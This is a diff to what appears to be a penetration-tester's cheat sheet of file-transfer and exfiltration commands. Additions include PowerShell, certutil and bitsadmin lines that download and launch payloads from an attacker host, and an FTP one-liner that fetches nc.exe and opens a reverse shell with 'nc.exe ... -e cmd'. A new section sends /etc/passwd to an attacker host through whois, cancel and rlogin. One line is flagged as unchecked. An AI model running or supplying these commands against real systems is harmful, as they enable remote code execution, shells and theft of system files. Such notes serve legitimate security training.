@@ -13,7 +13,6 @@ curl --upload-file shell.php --url http://$ip/shell.php --http1.0
 or
 curl -X PUT -T "/path/to/file" "http://$ip/puturl.tmp" 
 
-
 # Download (curl)
 curl -O http://host/file
 
@@ -24,22 +23,42 @@ cat filetoupload | base64 -w 0; echo
 On Target System:
 echo <copiedContent> | base64 -d > filetoupload
 
-# Serve a Directory (Python2)
-python -m SimpleHTTPServer
+# Serve a Directory on port 8000 (Python2)
+python -m SimpleHTTPServer [<port>]
 
-# Serve a directory (Python3)
-python -m http.server
+# Serve a directory on port 8000 (Python3)
+python -m http.server [<port>]
 
-# Serve a directory (PHP)
+# Serve a directory on port 80 (PHP)
 php -S $ip:80
+
+# Serve a directory on port 80 (Ruby)
+ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
 
 # Serve an FTP server
 pip install pyftpdlib
 python -m pyftpdlib -p 21
 
+# Serve an FTP server
+twistd -n ftp -p 21 -r /file/to/serve
+On Windows:
+echo open $ATTACKER>ftp-commands.txt
+echo anonymous>>ftp-commands.txt
+echo whatever>>ftp-commands.txt
+echo binary>>ftp-commands.txt
+echo get file.exe>>ftp-commands.txt
+echo bye>>ftp-commands.txt 
+ftp -s:ftp-commands.txt
+
+OR as a oneliner:
+(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
+
 # Serve an SMB server
 python smbserver.py WORKSPACE /dir
 smbserver.py devel /root/Desktop/htb/devel 
+
+On Windows:
+copy \\10.10.10.1:8080\FiletoTransfer FiletoTransfer (!!! TODO: check this one)
 
 # Setup an HTTP server supporting upload button
 wget https://gist.githubusercontent.com/UniIsland/3346170/raw/059aca1d510c615df3d9fedafabac4d538ebe352/SimpleHTTPServerWithUpload.py
@@ -63,3 +82,31 @@ powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATT
 powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
 
 powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
+
+# Download a file (certutil.exe)
+certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+
+# Download a file (bitsadmin)
+cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
+
+
+# Serve a TFTP server
+## TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
+service atftpd start
+On Windows:
+tftp -i $ATTACKER get /download/location/file /save/location/file
+
+===================================
+# Exfiltration Techniques
+
+# Whois exfiltration
+On attacker:
+nc -l -v -p 43 | sed "s/ //g" | base64 -d
+On victim:
+whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
+
+# Cancel exfil
+cancel -u "$(cat /etc/passwd)" -h ip:port
+
+# Rlogin exfil
+rlogin -l "$(cat /etc/passwd)" -p port host
